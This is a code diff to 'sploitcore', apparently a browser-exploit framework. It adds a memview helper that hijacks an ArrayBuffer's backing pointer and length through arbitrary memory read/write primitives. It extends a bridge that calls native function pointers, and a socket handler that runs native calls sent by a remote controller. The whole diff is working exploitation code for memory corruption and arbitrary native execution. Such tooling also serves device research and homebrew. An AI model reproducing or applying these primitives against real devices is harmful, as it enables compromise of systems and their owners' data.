@@ -289,6 +289,22 @@ sploitcore.prototype.write8 = function(val, addr, offset) {
 	this.write4(val[0], addr, offset);
 	this.write4(val[1], addr, offset + 1);
 };
+sploitcore.prototype.memview = function(addr, size, func) {
+	var ab = new ArrayBuffer(0);
+	var taddr = this.read8(this.getAddr(ab), 4);
+
+	var origPtr = this.read8(taddr, 6);
+	var origSize = this.read4(taddr, 8);
+	this.write8(addr, taddr, 6);
+	this.write4(size, taddr, 8);
+
+	var ret = func(ab);
+
+	this.write8(origPtr, taddr, 6);
+	this.write4(origSize, taddr, 8);
+
+	return ret;
+};
 sploitcore.prototype.getAddr = function(obj) {
 	this.leakee['b'] = {'a' : obj};
 	return this.read8(this.read8(this.leakaddr, 4), 4);
@@ -951,6 +967,9 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 	var self = this;
 	var args = Array.prototype.slice.call(arguments, [2]);
 
+	if(rettype == 'float')
+		throw 'Float returns not supported yet';
+
 	var sub = function() {
 		if(arguments.length != args.length)
 			throw 'Mismatched argument counts';
@@ -980,16 +999,16 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 					else if(typeof(inp) != 'string')
 						v = inp;
 					else {
-						inp = Array.prototype.map.call(inp, function(x) { return x.charCodeAt(0); });
 						var len = inp.length + 1;
 						if(len % 4 != 0)
 							len += 4 - (len % 4);
 						v = self.malloc(len);
-						for(var j = 0; j < len; j += 4) {
-							var a = inp.length > j+0 ? inp[j+0] : 0, b = inp.length > j+1 ? inp[j+1] : 0;
-							var c = inp.length > j+2 ? inp[j+2] : 0, d = inp.length > j+3 ? inp[j+3] : 0;
-							self.write4((d << 24) | (c << 16) | (b << 8) | a, v, j >> 2);
-						}
+						self.memview(v, len, function(view) {
+							var u8b = new Uint8Array(view);
+							for(var j = 0; j < len; ++j)
+								u8b[j] = inp.charCodeAt(j);
+							u8b[inp.length] = 0;
+						});
 					}
 					break;
 			}
@@ -1001,6 +1020,18 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 
 		var retval = self.call(ptr, nargs, nfargs);
 
+		switch(rettype) {
+			case char_p:
+				retval = self.memview(retval, 0xFFFFFFFF, function(view) {
+					var out = '';
+					var u8b = new Uint8Array(view);
+					for(var i = 0; u8b[i] != 0; ++i)
+						out += String.fromCharCode(u8b[i]);
+					return out;
+				});
+				break;
+		}
+
 		for(var i = 0; i < args.length; ++i) {
 			var na = nargs[i], type = args[i];
 			switch(type) {
@@ -1010,7 +1041,7 @@ sploitcore.prototype.bridge = function(ptr, rettype) {
 			}
 		}
 
-		return retval; // XXX: Do type processing
+		return retval;
 	};
 
 	sub.addr = ptr;
@@ -1083,7 +1114,9 @@ function handler(sc, socket) {
 				return log('unknown bridged fn');
 			}
 
-			var out = paddr(fn.apply(fn, data.args));
+			var out = fn.apply(fn, data.args);
+			if(fn.rettype != char_p)
+				out = paddr(out);
 
 			socket.send(JSON.stringify({
 				type: 'call',
@@ -1102,6 +1135,7 @@ function handler(sc, socket) {
 			data.args[0] = parseInt(data.args[0]);
 
 			var fn = sc.bridge.apply(sc, data.args);
+			fn.rettype = data.args[1];
 
 			log('saved fn as ' + name);
 
